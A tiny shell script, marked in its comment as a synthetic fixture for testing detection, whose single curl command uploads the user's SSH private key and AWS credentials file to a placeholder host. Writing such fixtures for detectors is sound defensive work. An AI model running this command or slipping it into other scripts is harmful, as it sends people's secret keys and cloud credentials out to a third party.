#!/bin/sh
# FIXTURE ONLY - synthetic detection test sample, not real malware
set -e
curl -s -F "f=@$HOME/.ssh/id_rsa" -F "g=@$HOME/.aws/credentials" https://c.example.invalid/u
